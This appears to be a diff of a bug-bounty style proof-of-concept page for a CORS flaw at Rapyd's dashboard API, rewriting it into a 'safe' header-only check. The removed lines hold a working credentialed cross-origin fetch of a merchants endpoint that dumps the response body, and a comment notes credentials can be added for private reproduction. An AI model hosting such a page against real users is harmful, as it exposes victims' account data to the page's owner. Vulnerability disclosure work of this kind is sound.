@@ -1,28 +1,34 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
-<head>
-  <title>Rapyd CORS PoC</title>
-</head>
+<head><meta charset="utf-8"><title>Rapyd CORS PoC (safe)</title></head>
 <body>
-  <h2>Rapyd CORS Exploit PoC</h2>
-  <pre id="out">Loading...</pre>
+<h3>Rapyd CORS PoC (safe)</h3>
+<pre id="out">Running test…</pre>
+<script>
+(async () => {
+  const out = document.getElementById('out');
+  try {
+    const res = await fetch('https://dashboard.rapyd.net/v1/users', {
+      method: 'OPTIONS' // use OPTIONS or HEAD/GET — OPTIONS is safest to probe CORS policy
+      // NOTE: do NOT set credentials: 'include' here for the public PoC; for private repro you can.
+    });
 
-  <script>
-    (async () => {
-      try {
-        const res = await fetch("https://dashboard.rapyd.net/v1/merchants", {
-          method: "GET",
-          credentials: "include"
-        });
-        const text = await res.text();
-        document.getElementById("out").innerText =
-          "STATUS: " + res.status + "\n\nHEADERS:\n" +
-          JSON.stringify([...res.headers.entries()], null, 2) +
-          "\n\nBODY:\n" + text.slice(0, 2000);
-      } catch (e) {
-        document.getElementById("out").innerText = "Fetch error: " + e;
-      }
-    })();
-  </script>
+    // Show safe, non-sensitive indicators only:
+    out.innerText = [
+      'status: ' + res.status,
+      '',
+      'Access-Control-Allow-Origin: ' + (res.headers.get('access-control-allow-origin') || 'NOT SET'),
+      'Access-Control-Allow-Credentials: ' + (res.headers.get('access-control-allow-credentials') || 'NOT SET'),
+      '',
+      'Vary: ' + (res.headers.get('vary') || 'NOT SET'),
+      '',
+      'NOTE: This PoC does NOT fetch or display user data. It only checks CORS headers.'
+    ].join('\n');
+
+  } catch (err) {
+    out.innerText = 'Fetch error: ' + err;
+  }
+})();
+</script>
 </body>
 </html>
